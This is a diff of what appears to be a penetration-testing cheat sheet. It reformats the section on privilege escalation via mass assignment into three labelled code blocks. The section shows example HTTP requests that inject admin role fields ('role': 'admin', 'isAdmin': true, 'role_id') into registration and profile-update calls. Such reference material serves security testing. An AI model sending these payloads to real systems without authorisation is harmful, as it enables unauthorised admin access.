@@ -125,16 +125,20 @@ POST /api/account/link-oauth
 
 ## Privilege Escalation via Mass Assignment
 
-```json
-// Add admin field to registration
+Add admin field to registration:
+```
 POST /api/register
 {"username": "attacker", "password": "test", "role": "admin"}
+```
 
-// Modify role during profile update
+Modify role during profile update:
+```
 PUT /api/profile
 {"name": "Attacker", "email": "a@b.com", "isAdmin": true}
+```
 
-// Hidden parameter pollution
+Hidden parameter pollution:
+```
 PUT /api/profile
 {"name": "Attacker", "role_id": 1, "group": "administrators"}
 ```
